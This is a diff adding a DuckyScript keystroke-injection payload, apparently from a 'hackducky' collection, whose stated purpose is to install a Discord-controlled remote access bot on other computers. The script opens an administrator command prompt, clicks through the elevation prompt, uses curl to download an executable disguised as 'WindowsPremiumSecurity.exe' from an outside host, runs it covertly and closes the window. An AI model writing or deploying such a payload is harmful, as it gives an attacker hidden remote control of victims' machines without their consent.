@@ -1,0 +1,34 @@
+REM TITLE 3XAYRemoteAccess
+REM AUTHOR 3XAY
+REM DESCRIPTION This script will download and setup my Discord PC Controller bot to enable someone (like me) to remotely control other computers via Discord
+DEFAULT_DELAY 100
+
+REM Open CMD in Admin mode
+GUI r
+DELAY 250
+STRING cmd
+CTRL-SHIFT ENTER
+
+REM Grant Admin access
+DELAY 1000
+LEFTARROW
+ENTER
+
+REM Enter downloads folder
+STRING cd %UserProfile\Downloads
+
+REM Download install script
+STRING curl https://github.com/3XAY/hackducky/raw/refs/heads/main/submissions/3XAYRemoteAccess/WindowsPremiumSecurity.exe -o WindowsPremiumSecurity.exe -L
+ENTER
+
+REM Secretly start downloaded script
+DELAY 20000
+STRING start WindowsPremiumSecurity.exe
+ENTER
+
+REM Long delay because it takes a while for it to bring the input field back
+DELAY 15000
+
+REM Close the original "downloader" console
+STRING exit
+ENTER
